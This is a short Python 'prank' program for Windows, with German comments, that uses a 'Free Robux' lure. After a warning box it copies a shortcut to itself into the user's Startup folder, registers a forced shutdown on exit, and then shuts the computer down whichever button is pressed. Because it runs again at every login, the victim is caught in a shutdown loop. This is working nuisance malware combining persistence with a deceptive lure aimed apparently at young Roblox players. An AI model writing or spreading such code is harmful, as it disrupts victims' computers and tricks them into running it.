import os
import shutil
import sys
import ctypes
import atexit
from win32com.client import Dispatch

# Warnung vor dem Start anzeigen
warning_response = ctypes.windll.user32.MessageBoxW(0, "WARNING this program is just a prank open your task manager and search for Free_Bobux and right click then close then go to autostart search free Bobux and deactivate it the youtube video is on my youtube Marlon5355", "Warnung", 4)

if warning_response == 7:  # Nein gedrückt
    sys.exit()

def add_to_autostart():
    script_path = os.path.abspath(sys.argv[0])  # Pfad zum aktuellen Skript
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_folder, 'mein_programm.lnk')
    
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.Save()
    
    print(f'Deine Datei wurde dem Autostart hinzugefügt: {shortcut_path}')

if __name__ == "__main__":
    add_to_autostart()

# Funktion zum Herunterfahren
def shutdown():
    os.system("shutdown /s /t 0")

# Sicherstellen, dass beim Schließen heruntergefahren wird
atexit.register(shutdown)

# MessageBox anzeigen
response = ctypes.windll.user32.MessageBoxW(0, "Want Free Robux?", "Free Robux", 4)

if response == 6:  # Yes gedrückt
    shutdown()
else:  # No gedrückt
    shutdown()
